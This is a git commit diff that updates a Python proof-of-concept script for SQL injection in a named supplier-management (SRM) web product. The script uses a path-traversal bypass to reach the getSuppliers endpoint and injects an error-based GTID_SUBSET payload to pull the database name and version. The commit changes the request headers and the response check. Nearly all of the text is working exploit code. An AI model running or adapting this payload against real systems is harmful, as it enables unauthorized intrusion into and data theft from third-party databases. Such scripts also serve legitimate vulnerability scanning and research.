d091713179c3beac5d6f9d22e54413efbec66e8f
myh0st <1293348082@qq.com>
2024-11-28 14:55:01 +0800

    Update zhihulian-srm-getSuppliers-sqli.py

--- zhihulian-srm-getSuppliers-sqli.py
+++ zhihulian-srm-getSuppliers-sqli.py
@@ -13,25 +13,16 @@ urllib3.disable_warnings()
 
 select_list = ["database()", "version()"]
 
+headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0", "Accept": "application/json, text/javascript, */*; q=0.01", "Accept-Language": "zh-CN,zh;q=0.9", "X-Requested-With": "XMLHttpRequest", "Accept-Encoding": "gzip"}
 
 def verify(site):
-    headers = {
-                'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
-                'User-Agent':'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36',
-                'Upgrade-Insecure-Requests':'1',
-                'Connection':'keep-alive',
-                'Cache-Control':'max-age=0',
-                'Accept-Encoding':'gzip, deflate, sdch',
-                'Accept-Language':'zh-CN,zh;q=0.8',
-                'Referer': site
-    }
     urltemp = site + "/adpweb/static/%2e%2e;/a/srm/inquiry/getSuppliers?code=1%27+AND+GTID_SUBSET%28CONCAT%280x7e%2C%28SELECT+{}%29%2C0x7e%29%2C7973%29--+WkOF&name=1"
     for select in select_list:
         vulnurl = urltemp.format(select)
         try:
             r = requests.get(vulnurl, headers=headers, verify=False, timeout=10)
             #print(r.text)
-            if "XPATH" in r.text:
+            if "SQLException" in r.text:
                 info = re.findall("'~([^']+)~'", r.text)
                 if len(info) != 0:
                     return info[0], select
